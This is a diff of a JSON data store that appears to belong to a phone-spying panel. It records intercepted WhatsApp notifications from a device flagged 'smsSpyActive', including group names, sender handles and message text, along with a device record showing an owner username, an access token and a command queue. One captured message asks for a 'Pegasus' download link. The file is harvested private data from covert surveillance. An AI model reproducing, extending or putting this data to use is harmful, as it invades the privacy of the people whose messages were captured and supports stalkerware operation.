@@ -22,6 +22,22 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (1244 pesan): ~ Bot",
+        "content": "📷 𐔈⃘ ֹ ׅ 🍓 ֹ Brat Generator ֹ ׅ ୫\n╭╼─┈───┈──⏣╼╯\n┆✿᪲ ׄ𖹭₊ Teks : wlc member\n╰─╼𔕬─┈───┈───┈",
+        "time": "02/04 06:17",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775081824985
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎1715 pesan dari 14 chat",
+        "time": "02/04 06:17",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775081824958
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (1243 pesan): ~ tiann",
         "content": ". brat wlc member",
         "time": "02/04 06:16",
@@ -4003,22 +4019,6 @@
         "time": "02/04 03:06",
         "pkg": "com.whatsapp",
         "receivedAt": 1775070409221
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝗚𝗕 𝗜𝗦𝗜𝗔𝗡 𝗕𝗬 𝗭𝗜𝗟 𝗫 𝗢𝗪𝗡 #𝟭 (26 pesan): ~ STR",
-        "content": "📷 550+",
-        "time": "02/04 03:06",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775070409162
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎All Buyer Pegasus-X ( No Update ) (282 pesan): ~ raxz",
-        "content": "bagi link download pegasus oi",
-        "time": "02/04 03:06",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775070409068
       }
     ],
     "galleryPhotos": [],
@@ -4065,6 +4065,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (1244 pesan): ~ Bot",
+        "content": "📷 𐔈⃘ ֹ ׅ 🍓 ֹ Brat Generator ֹ ׅ ୫\n╭╼─┈───┈──⏣╼╯\n┆✿᪲ ׄ𖹭₊ Teks : wlc member\n╰─╼𔕬─┈───┈───┈",
+        "time": "02/04 06:17",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775081825012
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (1243 pesan): ~ tiann",
@@ -8056,14 +8064,6 @@
         "time": "02/04 03:06",
         "pkg": "com.whatsapp",
         "receivedAt": 1775070409118
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎All Buyer Pegasus-X ( No Update ) (282 pesan): ~ raxz",
-        "content": "bagi link download pegasus oi",
-        "time": "02/04 03:06",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775070409038
       }
     ],
     "galleryPhotos": [],
@@ -8483,7 +8483,7 @@
     "deviceName": "HP-AHMADDDD1-4708",
     "ownerUsername": "Axmadz",
     "token": "520070cf4248976c6a5bc8d7767d78d8",
-    "lastSeen": 1775081820018,
+    "lastSeen": 1775081823023,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T17:49:10.524Z",
